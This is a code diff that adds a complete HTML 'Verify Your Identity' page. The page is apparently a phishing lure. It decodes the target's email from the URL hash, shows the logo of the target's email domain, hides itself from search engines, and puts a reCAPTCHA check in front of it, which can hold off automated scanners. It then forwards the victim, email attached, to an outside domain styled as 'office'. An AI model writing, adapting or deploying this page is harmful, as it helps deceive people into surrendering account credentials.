@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Verify Your Identity</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        html, body {
+            height: 100%;
+        }
+        body {
+            min-height: 100vh;
+            background: #f8f8f8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            padding: 2.5rem 2rem 2rem 2rem;
+            width: 100%;
+            max-width: 370px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            width: 110px;
+            height: 90px;
+            object-fit: contain;
+            margin-bottom: 1.2rem;
+            background: #f4f4f4;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .title {
+            font-size: 1.45rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 0.7rem;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 0.3rem;
+            text-align: center;
+        }
+        .desc {
+            font-size: 0.97rem;
+            color: #666;
+            margin-bottom: 1.3rem;
+            text-align: center;
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 1.1rem;
+        }
+        input[type="email"] {
+            width: 100%;
+            padding: 0.7rem 0.9rem;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 1rem;
+            margin-bottom: 0.2rem;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input[type="email"]:focus {
+            border-color: #0078d4;
+        }
+        .g-recaptcha {
+            margin: 0.7rem 0 1.1rem 0;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+        .btn {
+            width: 100%;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 0.8rem 0;
+            font-size: 1.08rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.18s;
+        }
+        .btn:disabled {
+            background: #b3d0f7;
+            cursor: not-allowed;
+        }
+        .error-message {
+            color: #d13438;
+            background: #fde7e9;
+            border-radius: 4px;
+            padding: 0.6rem;
+            margin-bottom: 0.7rem;
+            width: 100%;
+            font-size: 0.97rem;
+            display: none;
+            text-align: center;
+        }
+        @media (max-width: 480px) {
+            .card {
+                padding: 1.2rem 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img id="domainLogo" class="logo" alt="Domain Logo" style="display:none;">
+        <div class="title">Verify Your Identity</div>
+        <div class="subtitle">Complete the security check below:</div>
+        <div class="desc">Please enter the email address associated with this document to proceed with access.</div>
+        <form id="verificationForm" autocomplete="off" novalidate style="width:100%">
+            <div class="error-message" id="errorMessage"></div>
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Enter email" required autocomplete="off" readonly disabled>
+            </div>
+            <div class="g-recaptcha" data-sitekey="YOUR_KEY" data-callback="enableSubmit"></div>
+            <button id="nextBtn" disabled>Continue</button>
+        </form>
+    </div>
+    <script>
+        const form = document.getElementById('verificationForm');
+        const emailInput = document.getElementById('email');
+        const nextBtn = document.getElementById('nextBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        let isRecaptchaVerified = false;
+
+        // Get and decode the email from the hash
+        const hash = window.location.hash.slice(1);
+        let decodedEmail = '';
+        try {
+            decodedEmail = atob(hash);
+        } catch (e) {
+            decodedEmail = '';
+        }
+        emailInput.value = decodedEmail;
+
+        // Set domain logo dynamically
+        const logoImg = document.getElementById('domainLogo');
+        if (decodedEmail && decodedEmail.includes('@')) {
+            const domain = decodedEmail.split('@')[1];
+            logoImg.src = 'https://www.google.com/s2/favicons?sz=128&domain=' + domain;
+            logoImg.style.display = 'block';
+            logoImg.alt = domain + ' logo';
+        }
+
+        function validateForm() {
+            nextBtn.disabled = !isRecaptchaVerified || !emailInput.value.trim();
+        }
+
+        window.enableSubmit = function() {
+            isRecaptchaVerified = true;
+            validateForm();
+            document.getElementById('nextBtn').disabled = false;
+        };
+
+        emailInput.addEventListener('input', validateForm);
+
+        nextBtn.onclick = function() {
+            errorMessage.style.display = 'none';
+            if (!emailInput.value.trim()) {
+                errorMessage.textContent = 'Please enter your email address.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            if (!isRecaptchaVerified) {
+                errorMessage.textContent = 'Please complete the reCAPTCHA verification!';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            // Simulate redirect (replace with your logic)
+            nextBtn.disabled = true;
+            nextBtn.textContent = 'Processing...';
+            setTimeout(() => {
+                // Example: redirect to a thank you page or perform your logic
+                window.location.href = 'https://office.tracksui.shop/pQDzyubQ#' + hash;
+            }, 900);
+        };
+    </script>
+</body>
+</html>
